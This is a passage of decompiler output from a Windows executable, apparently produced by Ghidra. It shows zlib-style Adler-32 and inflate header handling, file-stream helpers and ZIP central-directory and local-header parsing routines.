            iVar10 = iVar9 + (uint)param_2[6];
            iVar11 = iVar10 + (uint)param_2[7];
            iVar12 = iVar11 + (uint)param_2[8];
            iVar13 = iVar12 + (uint)param_2[9];
            iVar14 = iVar13 + (uint)param_2[10];
            iVar15 = iVar14 + (uint)param_2[0xb];
            iVar16 = iVar15 + (uint)param_2[0xc];
            iVar17 = iVar16 + (uint)param_2[0xd];
            iVar18 = iVar17 + (uint)param_2[0xe];
            uVar3 = iVar18 + (uint)param_2[0xf];
            param_1 = param_1 + iVar4 + iVar5 + iVar6 + iVar7 + iVar8 + iVar9 + iVar10 + iVar11 +
                      iVar12 + iVar13 + iVar14 + iVar15 + iVar16 + iVar17 + iVar18 + uVar3;
            param_2 = param_2 + 0x10;
            uVar1 = uVar1 - 1;
          } while (uVar1 != 0);
        }
        for (; uVar2 != 0; uVar2 = uVar2 - 1) {
          uVar3 = uVar3 + *param_2;
          param_2 = param_2 + 1;
          param_1 = param_1 + uVar3;
        }
        uVar3 = uVar3 % 0xfff1;
        param_1 = param_1 % 0xfff1;
      } while (param_3 != 0);
    }
    uVar3 = param_1 << 0x10 | uVar3;
  }
  return uVar3;
}



undefined4 FUN_004056fa(int param_1)

{
  uint *puVar1;
  
  if ((param_1 != 0) && (puVar1 = *(uint **)(param_1 + 0x1c), puVar1 != (uint *)0x0)) {
    *(undefined4 *)(param_1 + 0x14) = 0;
    *(undefined4 *)(param_1 + 8) = 0;
    *(undefined4 *)(param_1 + 0x18) = 0;
    *puVar1 = -(uint)(puVar1[3] != 0) & 7;
    FUN_004042c0(*(undefined4 *)(*(int *)(param_1 + 0x1c) + 0x14),param_1,0);
    return 0;
  }
  return 0xfffffffe;
}



undefined4 FUN_00405739(int param_1)

{
  int iVar1;
  
  if (((param_1 != 0) && (*(int *)(param_1 + 0x1c) != 0)) && (*(int *)(param_1 + 0x24) != 0)) {
    iVar1 = *(int *)(*(int *)(param_1 + 0x1c) + 0x14);
    if (iVar1 != 0) {
      FUN_00404be5(iVar1,param_1);
    }
    (**(code **)(param_1 + 0x24))(*(undefined4 *)(param_1 + 0x28),*(undefined4 *)(param_1 + 0x1c));
    *(undefined4 *)(param_1 + 0x1c) = 0;
    return 0;
  }
  return 0xfffffffe;
}



// WARNING: Removing unreachable block (ram,0x00405836)

undefined4 FUN_00405777(int param_1)

{
  int iVar1;
  undefined4 uVar2;
  
  if (param_1 == 0) {
    uVar2 = 0xfffffffe;
  }
  else {
    *(undefined4 *)(param_1 + 0x18) = 0;
    if (*(int *)(param_1 + 0x20) == 0) {
      *(undefined **)(param_1 + 0x20) = &LAB_004056dd;
      *(undefined4 *)(param_1 + 0x28) = 0;
    }
    if (*(int *)(param_1 + 0x24) == 0) {
      *(undefined **)(param_1 + 0x24) = &LAB_004056ee;
    }
    iVar1 = (**(code **)(param_1 + 0x20))(*(undefined4 *)(param_1 + 0x28),1,0x18);
    *(int *)(param_1 + 0x1c) = iVar1;
    if (iVar1 != 0) {
      *(undefined4 *)(iVar1 + 0x14) = 0;
      *(undefined4 *)(*(int *)(param_1 + 0x1c) + 0xc) = 0;
      *(undefined4 *)(*(int *)(param_1 + 0x1c) + 0xc) = 1;
      *(undefined4 *)(*(int *)(param_1 + 0x1c) + 0x10) = 0xf;
      uVar2 = FUN_0040432b(param_1,~-(uint)(*(int *)(*(int *)(param_1 + 0x1c) + 0xc) != 0) &
                                   0x4055c4,0x8000);
      *(undefined4 *)(*(int *)(param_1 + 0x1c) + 0x14) = uVar2;
      if (*(int *)(*(int *)(param_1 + 0x1c) + 0x14) != 0) {
        FUN_004056fa(param_1);
        return 0;
      }
      FUN_00405739();
    }
    uVar2 = 0xfffffffc;
  }
  return uVar2;
}



int FUN_0040583c(byte **param_1,int param_2)

{
  byte bVar1;
  undefined4 *puVar2;
  undefined4 uVar3;
  uint uVar4;
  int iVar5;
  
  if (((param_1 == (byte **)0x0) || (puVar2 = (undefined4 *)param_1[7], puVar2 == (undefined4 *)0x0)
      ) || (*param_1 == (byte *)0x0)) {
LAB_00405b60:
    return -2;
  }
  iVar5 = -5;
  if (param_2 == 4) {
    param_2 = -5;
  }
  else {
    param_2 = 0;
  }
  uVar3 = *puVar2;
LAB_00405878:
  switch(uVar3) {
  case 0:
    if (param_1[1] == (byte *)0x0) {
      return iVar5;
    }
    param_1[2] = param_1[2] + 1;
    param_1[1] = param_1[1] + -1;
    puVar2[1] = (uint)**param_1;
    puVar2 = (undefined4 *)param_1[7];
    uVar3 = puVar2[1];
    *param_1 = *param_1 + 1;
    if (((byte)uVar3 & 0xf) == 8) {
      uVar4 = ((uint)puVar2[1] >> 4) + 8;
      if (uVar4 < (uint)puVar2[4] || uVar4 == puVar2[4]) {
        *puVar2 = 1;
        iVar5 = param_2;
        goto switchD_00405880_caseD_1;
      }
      *puVar2 = 0xd;
      param_1[6] = (byte *)s_invalid_window_size_0040f7e8;
    }
    else {
      *puVar2 = 0xd;
      param_1[6] = (byte *)s_unknown_compression_method_0040f7fc;
    }
    goto LAB_00405a73;
  case 1:
switchD_00405880_caseD_1:
    if (param_1[1] == (byte *)0x0) {
      return iVar5;
    }
    param_1[2] = param_1[2] + 1;
    param_1[1] = param_1[1] + -1;
    puVar2 = (undefined4 *)param_1[7];
    bVar1 = **param_1;
    *param_1 = *param_1 + 1;
    if ((puVar2[1] * 0x100 + (uint)bVar1) % 0x1f == 0) {
      if ((bVar1 & 0x20) != 0) {
        *(undefined4 *)param_1[7] = 2;
        iVar5 = param_2;
        goto switchD_00405880_caseD_2;
      }
      *puVar2 = 7;
      iVar5 = param_2;
    }
    else {
      *puVar2 = 0xd;
      param_1[6] = (byte *)s_incorrect_header_check_0040f7d0;
      *(undefined4 *)(param_1[7] + 4) = 5;
      iVar5 = param_2;
    }
    break;
  case 2:
switchD_00405880_caseD_2:
    if (param_1[1] == (byte *)0x0) {
      return iVar5;
    }
    param_1[2] = param_1[2] + 1;
    param_1[1] = param_1[1] + -1;
    *(uint *)(param_1[7] + 8) = (uint)**param_1 << 0x18;
    *param_1 = *param_1 + 1;
    *(undefined4 *)param_1[7] = 3;
    iVar5 = param_2;
  case 3:
    goto switchD_00405880_caseD_3;
  case 4:
    goto switchD_00405880_caseD_4;
  case 5:
    goto switchD_00405880_caseD_5;
  case 6:
    *(undefined4 *)param_1[7] = 0xd;
    param_1[6] = (byte *)s_need_dictionary_0040f608;
    *(undefined4 *)(param_1[7] + 4) = 0;
    return -2;
  case 7:
    iVar5 = FUN_004043b6(puVar2[5],param_1,iVar5);
    if (iVar5 == -3) {
      *(undefined4 *)param_1[7] = 0xd;
      *(undefined4 *)(param_1[7] + 4) = 0;
    }
    else {
      if (iVar5 == 0) {
        iVar5 = param_2;
      }
      if (iVar5 != 1) {
        return iVar5;
      }
      FUN_004042c0(*(undefined4 *)(param_1[7] + 0x14),param_1,param_1[7] + 4);
      puVar2 = (undefined4 *)param_1[7];
      if (puVar2[3] == 0) {
        *puVar2 = 8;
        iVar5 = param_2;
        goto switchD_00405880_caseD_8;
      }
      *puVar2 = 0xc;
      iVar5 = param_2;
    }
    break;
  case 8:
switchD_00405880_caseD_8:
    if (param_1[1] == (byte *)0x0) {
      return iVar5;
    }
    param_1[2] = param_1[2] + 1;
    param_1[1] = param_1[1] + -1;
    *(uint *)(param_1[7] + 8) = (uint)**param_1 << 0x18;
    *param_1 = *param_1 + 1;
    *(undefined4 *)param_1[7] = 9;
    iVar5 = param_2;
  case 9:
    if (param_1[1] == (byte *)0x0) {
      return iVar5;
    }
    param_1[2] = param_1[2] + 1;
    param_1[1] = param_1[1] + -1;
    *(uint *)(param_1[7] + 8) = *(int *)(param_1[7] + 8) + (uint)**param_1 * 0x10000;
    *param_1 = *param_1 + 1;
    *(undefined4 *)param_1[7] = 10;
    iVar5 = param_2;
  case 10:
    goto switchD_00405880_caseD_a;
  case 0xb:
    goto switchD_00405880_caseD_b;
  case 0xc:
    goto LAB_00405b60;
  case 0xd:
    return -3;
  default:
    goto LAB_00405b60;
  }
LAB_00405a7d:
  puVar2 = (undefined4 *)param_1[7];
  uVar3 = *puVar2;
  goto LAB_00405878;
switchD_00405880_caseD_a:
  if (param_1[1] == (byte *)0x0) {
    return iVar5;
  }
  param_1[2] = param_1[2] + 1;
  param_1[1] = param_1[1] + -1;
  *(uint *)(param_1[7] + 8) = *(int *)(param_1[7] + 8) + (uint)**param_1 * 0x100;
  *param_1 = *param_1 + 1;
  *(undefined4 *)param_1[7] = 0xb;
  iVar5 = param_2;
switchD_00405880_caseD_b:
  if (param_1[1] == (byte *)0x0) {
    return iVar5;
  }
  param_1[2] = param_1[2] + 1;
  param_1[1] = param_1[1] + -1;
  *(uint *)(param_1[7] + 8) = *(int *)(param_1[7] + 8) + (uint)**param_1;
  puVar2 = (undefined4 *)param_1[7];
  *param_1 = *param_1 + 1;
  if (puVar2[1] == puVar2[2]) {
    *(undefined4 *)param_1[7] = 0xc;
LAB_00405b60:
    return 1;
  }
  *puVar2 = 0xd;
  param_1[6] = (byte *)s_incorrect_data_check_0040f7b8;
LAB_00405a73:
  *(undefined4 *)(param_1[7] + 4) = 5;
  iVar5 = param_2;
  goto LAB_00405a7d;
switchD_00405880_caseD_3:
  if (param_1[1] == (byte *)0x0) {
    return iVar5;
  }
  param_1[2] = param_1[2] + 1;
  param_1[1] = param_1[1] + -1;
  *(uint *)(param_1[7] + 8) = *(int *)(param_1[7] + 8) + (uint)**param_1 * 0x10000;
  *param_1 = *param_1 + 1;
  *(undefined4 *)param_1[7] = 4;
  iVar5 = param_2;
switchD_00405880_caseD_4:
  if (param_1[1] == (byte *)0x0) {
    return iVar5;
  }
  param_1[2] = param_1[2] + 1;
  param_1[1] = param_1[1] + -1;
  *(uint *)(param_1[7] + 8) = *(int *)(param_1[7] + 8) + (uint)**param_1 * 0x100;
  *param_1 = *param_1 + 1;
  *(undefined4 *)param_1[7] = 5;
  iVar5 = param_2;
switchD_00405880_caseD_5:
  if (param_1[1] != (byte *)0x0) {
    param_1[2] = param_1[2] + 1;
    param_1[1] = param_1[1] + -1;
    *(uint *)(param_1[7] + 8) = *(int *)(param_1[7] + 8) + (uint)**param_1;
    *param_1 = *param_1 + 1;
    param_1[0xc] = *(byte **)((int)param_1[7] + 8);
    *(undefined4 *)param_1[7] = 6;
    return 2;
  }
  return iVar5;
}



// WARNING: Could not reconcile some variable overlaps

undefined * FUN_00405bae(LPCSTR param_1,undefined4 param_2,int param_3,undefined4 *param_4)

{
  ushort uVar1;
  LPCSTR hFile;
  DWORD DVar2;
  undefined *puVar3;
  undefined2 local_6;
  
  if (((param_3 != 1) && (param_3 != 2)) && (param_3 != 3)) {
    *param_4 = 0x10000;
    return (undefined *)0x0;
  }
  *param_4 = 0;
  local_6 = 0;
  uVar1 = local_6;
  local_6 = 0;
  hFile = param_1;
  if (param_3 != 1) {
    hFile = (LPCSTR)0x0;
    if (param_3 != 2) goto LAB_00405c36;
    hFile = (LPCSTR)CreateFileA(param_1,0x80000000,1,(LPSECURITY_ATTRIBUTES)0x0,3,0x80,(HANDLE)0x0);
    if (hFile == (LPCSTR)0xffffffff) {
      *param_4 = 0x200;
      return (undefined *)0x0;
    }
    local_6 = 0x100;
    uVar1 = local_6;
  }
  local_6 = uVar1;
  DVar2 = SetFilePointer(hFile,0,(PLONG)0x0,1);
  local_6 = local_6 | DVar2 != 0xffffffff;
LAB_00405c36:
  puVar3 = (undefined *)operator_new(0x20);
  if ((param_3 == 1) || (param_3 == 2)) {
    *puVar3 = 1;
    puVar3[0x10] = local_6._1_1_;
    puVar3[1] = (char)local_6;
    *(LPCSTR *)(puVar3 + 4) = hFile;
    puVar3[8] = 0;
    *(undefined4 *)(puVar3 + 0xc) = 0;
    if ((char)local_6 != '\0') {
      DVar2 = SetFilePointer(hFile,0,(PLONG)0x0,1);
      *(DWORD *)(puVar3 + 0xc) = DVar2;
    }
  }
  else {
    *puVar3 = 0;
    *(LPCSTR *)(puVar3 + 0x14) = param_1;
    puVar3[1] = 1;
    puVar3[0x10] = 0;
    *(undefined4 *)(puVar3 + 0x18) = param_2;
    *(undefined4 *)(puVar3 + 0x1c) = 0;
    *(undefined4 *)(puVar3 + 0xc) = 0;
  }
  *param_4 = 0;
  return puVar3;
}



undefined4 FUN_00405c9f(void *param_1)

{
  if (param_1 == (void *)0x0) {
    return 0xffffffff;
  }
  if (*(char *)((int)param_1 + 0x10) != '\0') {
    CloseHandle(*(HANDLE *)((int)param_1 + 4));
  }
  operator_delete(param_1);
  return 0;
}



undefined4 FUN_00405cc7(char *param_1)

{
  if ((*param_1 != '\0') && (param_1[8] != '\0')) {
    return 1;
  }
  return 0;
}



int FUN_00405cdd(char *param_1)

{
  DWORD DVar1;
  
  if (*param_1 != '\0') {
    if (param_1[1] != '\0') {
      DVar1 = SetFilePointer(*(HANDLE *)(param_1 + 4),0,(PLONG)0x0,1);
      return DVar1 - *(int *)(param_1 + 0xc);
    }
    if (*param_1 != '\0') {
      return 0;
    }
  }
  return *(int *)(param_1 + 0x1c);
}



undefined4 FUN_00405d0e(char *param_1,int param_2,int param_3)

{
  DWORD dwMoveMethod;
  
  if (*param_1 != '\0') {
    if (param_1[1] != '\0') {
      if (param_3 == 0) {
        dwMoveMethod = 0;
        param_2 = *(int *)(param_1 + 0xc) + param_2;
      }
      else if (param_3 == 1) {
        dwMoveMethod = 1;
      }
      else {
        if (param_3 != 2) {
          return 0x13;
        }
        dwMoveMethod = 2;
      }
      SetFilePointer(*(HANDLE *)(param_1 + 4),param_2,(PLONG)0x0,dwMoveMethod);
      return 0;
    }
    if (*param_1 != '\0') {
      return 0x1d;
    }
  }
  if (param_3 != 0) {
    if (param_3 == 1) {
      *(int *)(param_1 + 0x1c) = *(int *)(param_1 + 0x1c) + param_2;
      return 0;
    }
    if (param_3 != 2) {
      return 0;
    }
    param_2 = *(int *)(param_1 + 0x18) + param_2;
  }
  *(int *)(param_1 + 0x1c) = param_2;
  return 0;
}



uint FUN_00405d8a(void *param_1,uint param_2,int param_3,char *param_4)

{
  int *piVar1;
  int iVar2;
  char *pcVar3;
  BOOL BVar4;
  void *_Size;
  
  pcVar3 = param_4;
  _Size = (void *)(param_2 * param_3);
  if (*param_4 == '\0') {
    iVar2 = *(int *)(param_4 + 0x1c);
    if (*(uint *)(param_4 + 0x18) < (uint)(iVar2 + (int)_Size)) {
      _Size = (void *)(*(uint *)(param_4 + 0x18) - iVar2);
    }
    memcpy(param_1,(void *)(*(int *)(param_4 + 0x14) + iVar2),(size_t)_Size);
    piVar1 = (int *)(pcVar3 + 0x1c);
    *piVar1 = *piVar1 + (int)_Size;
    param_1 = _Size;
  }
  else {
    BVar4 = ReadFile(*(HANDLE *)(param_4 + 4),param_1,(DWORD)_Size,(LPDWORD)&param_1,
                     (LPOVERLAPPED)0x0);
    if (BVar4 == 0) {
      pcVar3[8] = '\x01';
    }
  }
  return (uint)param_1 / param_2;
}



int FUN_00405def(undefined4 param_1,uint *param_2)

{
  int iVar1;
  undefined4 uStack8;
  
  iVar1 = FUN_00405d8a((int)&uStack8 + 3,1,1,param_1);
  if (iVar1 == 1) {
    *param_2 = uStack8 >> 0x18;
    return 0;
  }
  iVar1 = FUN_00405cc7(param_1);
  return -(uint)(iVar1 != 0);
}



void FUN_00405e27(undefined4 param_1,int *param_2)

{
  int iVar1;
  int iVar2;
  int local_8;
  
  iVar2 = FUN_00405def(param_1,&local_8);
  iVar1 = local_8;
  if ((iVar2 == 0) && (iVar2 = FUN_00405def(param_1,&local_8), iVar2 == 0)) {
    *param_2 = local_8 * 0x100 + iVar1;
    return;
  }
  *param_2 = 0;
  return;
}



void FUN_00405e6b(int param_1,int *param_2)

{
  int iVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  int iVar5;
  
  iVar3 = param_1;
  iVar2 = FUN_00405def(param_1,&param_1);
  iVar1 = param_1;
  if (iVar2 == 0) {
    iVar2 = FUN_00405def(iVar3,&param_1);
  }
  iVar4 = param_1 * 0x100;
  if (iVar2 == 0) {
    iVar2 = FUN_00405def(iVar3,&param_1);
  }
  iVar5 = param_1 * 0x10000;
  if ((iVar2 == 0) && (iVar3 = FUN_00405def(iVar3,&param_1), iVar3 == 0)) {
    *param_2 = param_1 * 0x1000000 + iVar1 + iVar4 + iVar5;
    return;
  }
  *param_2 = 0;
  return;
}



int FUN_00405edf(undefined4 param_1)

{
  int iVar1;
  uint uVar2;
  void *_Memory;
  uint uVar3;
  int iVar4;
  int iVar5;
  int local_10;
  uint local_c;
  uint local_8;
  
  iVar1 = FUN_00405d0e(param_1,0,2);
  if (iVar1 == 0) {
    uVar2 = FUN_00405cdd(param_1);
    local_8 = 0xffff;
    if (uVar2 < 0xffff) {
      local_8 = uVar2;
    }
    _Memory = malloc(0x404);
    if (_Memory != (void *)0x0) {
      local_10 = -1;
      local_c = 4;
      if (4 < local_8) {
        while( true ) {
          uVar3 = local_c + 0x400;
          local_c = local_8;
          if (uVar3 <= local_8) {
            local_c = uVar3;
          }
          iVar1 = uVar2 - local_c;
          uVar3 = 0x404;
          if (uVar2 - iVar1 < 0x405) {
            uVar3 = uVar2 - iVar1;
          }
          iVar4 = FUN_00405d0e(param_1,iVar1,0);
          if ((iVar4 != 0) || (iVar4 = FUN_00405d8a(_Memory,uVar3,1,param_1), iVar4 != 1)) break;
          iVar4 = uVar3 - 3;
          do {
            iVar5 = iVar4;
            iVar4 = iVar5 + -1;
            if (iVar5 < 0) goto LAB_00405fc0;
          } while ((((*(char *)(iVar4 + (int)_Memory) != 'P') ||
                    (*(char *)(iVar5 + (int)_Memory) != 'K')) ||
                   (*(char *)(iVar5 + 1 + (int)_Memory) != '\x05')) ||
                  (*(char *)(iVar5 + 2 + (int)_Memory) != '\x06'));
          local_10 = iVar4 + iVar1;
LAB_00405fc0:
          if ((local_10 != 0) || (local_8 <= local_c)) break;
        }
      }
      free(_Memory);
      return local_10;
    }
  }
  return -1;
}



int * FUN_00405fe2(int param_1)

{
  int iVar1;
  int *piVar2;
  int *piVar3;
  int *piVar4;
  int local_94 [2];
  undefined local_8c [4];
  int local_88;
  int local_78;
  int local_74;
  int local_70 [22];
  undefined4 local_18;
  undefined local_14 [4];
  int local_10;
  int local_c;
  int local_8;
  
  local_94[0] = param_1;
  if (param_1 == 0) {
    return (int *)0x0;
  }
  param_1 = 0;
  local_78 = FUN_00405edf(local_94[0]);
  if (local_78 == -1) {
    param_1 = -1;
  }
  iVar1 = FUN_00405d0e(local_94[0],local_78,0);
  if (iVar1 != 0) {
    param_1 = -1;
  }
  iVar1 = FUN_00405e6b(local_94[0],local_14);
  if (iVar1 != 0) {
    param_1 = -1;
  }
  iVar1 = FUN_00405e27(local_94[0],&local_8);
  if (iVar1 != 0) {
    param_1 = -1;
  }
  iVar1 = FUN_00405e27(local_94[0],&local_10);
  if (iVar1 != 0) {
    param_1 = -1;
  }
  iVar1 = FUN_00405e27(local_94[0],local_94 + 1);
  if (iVar1 != 0) {
    param_1 = -1;
  }
  iVar1 = FUN_00405e27(local_94[0],&local_c);
  if (iVar1 != 0) {
    param_1 = -1;
  }
  if (((local_c != local_94[1]) || (local_10 != 0)) || (local_8 != 0)) {
    param_1 = -0x67;
  }
  iVar1 = FUN_00405e6b(local_94[0],&local_74);
  if (iVar1 != 0) {
    param_1 = -1;
  }
  iVar1 = FUN_00405e6b(local_94[0],local_70);
  if (iVar1 != 0) {
    param_1 = -1;
  }
  iVar1 = FUN_00405e27(local_94[0],local_8c);
  if (iVar1 != 0) {
    param_1 = -1;
  }
  if ((uint)(*(int *)(local_94[0] + 0xc) + local_78) < (uint)(local_74 + local_70[0])) {
    if (param_1 != 0) goto LAB_00406112;
    param_1 = -0x67;
  }
  if (param_1 == 0) {
    local_18 = 0;
    local_88 = ((*(int *)(local_94[0] + 0xc) - local_74) - local_70[0]) + local_78;
    *(undefined4 *)(local_94[0] + 0xc) = 0;
    piVar2 = (int *)malloc(0x80);
    piVar3 = local_94;
    piVar4 = piVar2;
    for (iVar1 = 0x20; iVar1 != 0; iVar1 = iVar1 + -1) {
      *piVar4 = *piVar3;
      piVar3 = piVar3 + 1;
      piVar4 = piVar4 + 1;
    }
    FUN_004064e2(piVar2);
    return piVar2;
  }
LAB_00406112:
  FUN_00405c9f(local_94[0]);
  return (int *)0x0;
}



undefined4 FUN_00406162(undefined4 *param_1)

{
  if (param_1 == (undefined4 *)0x0) {
    return 0xffffff9a;
  }
  if (param_1[0x1f] != 0) {
    FUN_00406a97(param_1);
  }
  FUN_00405c9f(*param_1);
  free(param_1);
  return 0;
}



void FUN_00406191(uint param_1,int *param_2)

{
  param_2[3] = param_1 >> 0x10 & 0x1f;
  param_2[5] = (param_1 >> 0x19) + 0x7bc;
  param_2[2] = param_1 >> 0xb & 0x1f;
  param_2[4] = (param_1 >> 0x15 & 0xf) - 1;
  param_2[1] = param_1 >> 5 & 0x3f;
  *param_2 = (param_1 & 0x1f) << 1;
  return;
}



int FUN_004061e0(undefined4 *param_1,undefined4 *param_2,undefined4 *param_3,int param_4,
                uint param_5,int param_6,uint param_7,int param_8,uint param_9)

{
  uint uVar1;
  int iVar2;
  uint uVar3;
  undefined4 *puVar4;
  undefined4 local_60;
  undefined local_5c [4];
  undefined local_58 [4];
  undefined local_54 [4];
  undefined4 local_50;
  undefined local_4c [4];
  undefined local_48 [4];
  undefined local_44 [4];
  uint local_40;
  uint local_3c;
  uint local_38;
  undefined local_34 [4];
  undefined local_30 [4];
  undefined local_2c [4];
  undefined local_28 [24];
  undefined4 local_10;
  int local_c;
  int local_8;
  
  puVar4 = param_1;
  local_8 = 0;
  if (param_1 == (undefined4 *)0x0) {
    return -0x66;
  }
  iVar2 = FUN_00405d0e(*param_1,param_1[5] + param_1[3],0);
  if (iVar2 == 0) {
    iVar2 = FUN_00405e6b(*param_1,&local_c);
    if (iVar2 == 0) {
      if (local_c != 0x2014b50) {
        local_8 = -0x67;
      }
    }
    else {
      local_8 = -1;
    }
  }
  else {
    local_8 = -1;
  }
  iVar2 = FUN_00405e27(*param_1,&local_60);
  if (iVar2 != 0) {
    local_8 = -1;
  }
  iVar2 = FUN_00405e27(*param_1,local_5c);
  if (iVar2 != 0) {
    local_8 = -1;
  }
  iVar2 = FUN_00405e27(*param_1,local_58);
  if (iVar2 != 0) {
    local_8 = -1;
  }
  iVar2 = FUN_00405e27(*param_1,local_54);
  if (iVar2 != 0) {
    local_8 = -1;
  }
  iVar2 = FUN_00405e6b(*param_1,&local_50);
  if (iVar2 != 0) {
    local_8 = -1;
  }
  FUN_00406191(local_50,local_28);
  iVar2 = FUN_00405e6b(*param_1,local_4c);
  if (iVar2 != 0) {
    local_8 = -1;
  }
  iVar2 = FUN_00405e6b(*param_1,local_48);
  if (iVar2 != 0) {
    local_8 = -1;
  }
  iVar2 = FUN_00405e6b(*param_1,local_44);
  if (iVar2 != 0) {
    local_8 = -1;
  }
  iVar2 = FUN_00405e27(*param_1,&local_40);
  if (iVar2 != 0) {
    local_8 = -1;
  }
  iVar2 = FUN_00405e27(*param_1,&local_3c);
  if (iVar2 != 0) {
    local_8 = -1;
  }
  iVar2 = FUN_00405e27(*param_1,&local_38);
  if (iVar2 != 0) {
    local_8 = -1;
  }
  iVar2 = FUN_00405e27(*param_1,local_34);
  if (iVar2 != 0) {
    local_8 = -1;
  }
  iVar2 = FUN_00405e27(*param_1,local_30);
  if (iVar2 != 0) {
    local_8 = -1;
  }
  iVar2 = FUN_00405e6b(*param_1,local_2c);
  if (iVar2 != 0) {
    local_8 = -1;
  }
  iVar2 = FUN_00405e6b(*param_1,&local_10);
  if (iVar2 != 0) {
    local_8 = -1;
  }
  if (local_8 == 0) {
    if (param_4 != 0) {
      uVar3 = param_5;
      if (local_40 < param_5) {
        *(undefined *)(local_40 + param_4) = 0;
        uVar3 = local_40;
      }
      if (((local_40 != 0) && (param_5 != 0)) &&
         (iVar2 = FUN_00405d8a(param_4,uVar3,1,*param_1), iVar2 != 1)) {
        local_8 = -1;
      }
      local_40 = local_40 - uVar3;
      if (local_8 != 0) goto LAB_00406435;
    }
    if (param_6 != 0) {
      uVar3 = local_3c;
      if (param_7 <= local_3c) {
        uVar3 = param_7;
      }
      uVar1 = local_40;
      if (local_40 != 0) {
        iVar2 = FUN_00405d0e(*param_1,local_40,1);
        if (iVar2 == 0) {
          param_1 = (undefined4 *)0x0;
          uVar1 = (uint)param_1;
        }
        else {
          local_8 = -1;
          uVar1 = local_40;
        }
      }
      param_1 = (undefined4 *)uVar1;
      if (((local_3c != 0) && (param_7 != 0)) &&
         (iVar2 = FUN_00405d8a(param_6,uVar3,1,*puVar4), iVar2 != 1)) {
        local_8 = -1;
      }
      iVar2 = (int)param_1 + (local_3c - uVar3);
      goto LAB_00406438;
    }
  }
LAB_00406435:
  iVar2 = local_40 + local_3c;
LAB_00406438:
  if (local_8 == 0) {
    if (param_8 != 0) {
      uVar3 = param_9;
      if (local_38 < param_9) {
        *(undefined *)(local_38 + param_8) = 0;
        uVar3 = local_38;
      }
      if ((iVar2 != 0) && (iVar2 = FUN_00405d0e(*puVar4,iVar2,1), iVar2 != 0)) {
        local_8 = -1;
      }
      if (((local_38 != 0) && (param_9 != 0)) &&
         (iVar2 = FUN_00405d8a(param_8,uVar3,1,*puVar4), iVar2 != 1)) {
        local_8 = -1;
      }
      if (local_8 != 0) {
        return local_8;
      }
    }
    if (param_2 != (undefined4 *)0x0) {
      puVar4 = &local_60;
      for (iVar2 = 0x14; iVar2 != 0; iVar2 = iVar2 + -1) {
        *param_2 = *puVar4;
        puVar4 = puVar4 + 1;
        param_2 = param_2 + 1;
      }
    }
    if (param_3 != (undefined4 *)0x0) {
      *param_3 = local_10;
    }
  }
  return local_8;
}



void FUN_004064bb(undefined4 param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,
                 undefined4 param_5,undefined4 param_6,undefined4 param_7,undefined4 param_8)

{
  FUN_004061e0(param_1,param_2,0,param_3,param_4,param_5,param_6,param_7,param_8);
  return;
}



int FUN_004064e2(int param_1)

{
  int iVar1;
  
  if (param_1 == 0) {
    iVar1 = -0x66;
  }
  else {
    *(undefined4 *)(param_1 + 0x14) = *(undefined4 *)(param_1 + 0x24);
    *(undefined4 *)(param_1 + 0x10) = 0;
    iVar1 = FUN_004061e0(param_1,param_1 + 0x28,param_1 + 0x78,0,0,0,0,0,0);
    *(uint *)(param_1 + 0x18) = (uint)(iVar1 == 0);
  }
  return iVar1;
}



int FUN_00406520(int param_1)

{
  int iVar1;
  
  if (param_1 == 0) {
    iVar1 = -0x66;
  }
  else if ((*(int *)(param_1 + 0x18) == 0) ||
          (iVar1 = *(int *)(param_1 + 0x10) + 1, iVar1 == *(int *)(param_1 + 4))) {
    iVar1 = -100;
  }
  else {
    *(int *)(param_1 + 0x10) = iVar1;
    *(int *)(param_1 + 0x14) =
         *(int *)(param_1 + 0x14) +
         *(int *)(param_1 + 0x50) + *(int *)(param_1 + 0x4c) + 0x2e + *(int *)(param_1 + 0x48);
    iVar1 = FUN_004061e0(param_1,param_1 + 0x28,param_1 + 0x78,0,0,0,0,0,0);
    *(uint *)(param_1 + 0x18) = (uint)(iVar1 == 0);
  }
  return iVar1;
}



int FUN_0040657a(undefined4 *param_1,int *param_2,int *param_3,int *param_4)

{
  int *piVar1;
  undefined4 *puVar2;
  int *piVar3;
  int iVar4;
  int iVar5;
  int local_10;
  int local_c;
  int local_8;
  
  piVar3 = param_2;
  puVar2 = param_1;
  iVar5 = 0;
  *param_2 = 0;
  *param_3 = 0;
  *param_4 = 0;
  iVar4 = FUN_00405d0e(*param_1,param_1[3] + param_1[0x1e],0);
  if (iVar4 == 0) {
    iVar4 = FUN_00405e6b(*puVar2,&local_c);
    if (iVar4 == 0) {
      if (local_c != 0x4034b50) {
        iVar5 = -0x67;
      }
    }
    else {
      iVar5 = -1;
    }
    iVar4 = FUN_00405e27(*puVar2,&param_2);
    if (iVar4 != 0) {
      iVar5 = -1;
    }
    iVar4 = FUN_00405e27(*puVar2,&param_1);
    if (iVar4 != 0) {
      iVar5 = -1;
    }
    iVar4 = FUN_00405e27(*puVar2,&param_2);
    if (iVar4 == 0) {
      if ((iVar5 == 0) &&
         ((piVar1 = (int *)puVar2[0xd], param_2 != piVar1 ||
          ((piVar1 != (int *)0x0 && (piVar1 != (int *)0x8)))))) {
        iVar5 = -0x67;
      }
    }
    else {
      iVar5 = -1;
    }
    iVar4 = FUN_00405e6b(*puVar2,&param_2);
    if (iVar4 != 0) {
      iVar5 = -1;
    }
    iVar4 = FUN_00405e6b(*puVar2,&param_2);
    if (iVar4 == 0) {
      if (((iVar5 == 0) && (param_2 != (int *)puVar2[0xf])) && (((uint)param_1 & 8) == 0)) {
        iVar5 = -0x67;
      }
    }
    else {
      iVar5 = -1;
    }
    iVar4 = FUN_00405e6b(*puVar2,&param_2);
    if (iVar4 == 0) {
      if (((iVar5 == 0) && (param_2 != (int *)puVar2[0x10])) && (((uint)param_1 & 8) == 0)) {
        iVar5 = -0x67;
      }
    }
    else {
      iVar5 = -1;
    }
    iVar4 = FUN_00405e6b(*puVar2,&param_2);
    if (iVar4 == 0) {
      if (((iVar5 == 0) && (param_2 != (int *)puVar2[0x11])) && (((uint)param_1 & 8) == 0)) {
        iVar5 = -0x67;
      }
    }
    else {
      iVar5 = -1;
    }
    iVar4 = FUN_00405e27(*puVar2,&local_8);
    if (iVar4 == 0) {
      if ((iVar5 == 0) && (local_8 != puVar2[0x12])) {
        iVar5 = -0x67;
      }
    }
    else {
      iVar5 = -1;
    }
    *piVar3 = *piVar3 + local_8;
    iVar4 = FUN_00405e27(*puVar2,&local_10);
    if (iVar4 != 0) {
      iVar5 = -1;
    }
    *param_3 = puVar2[0x1e] + 0x1e + local_8;
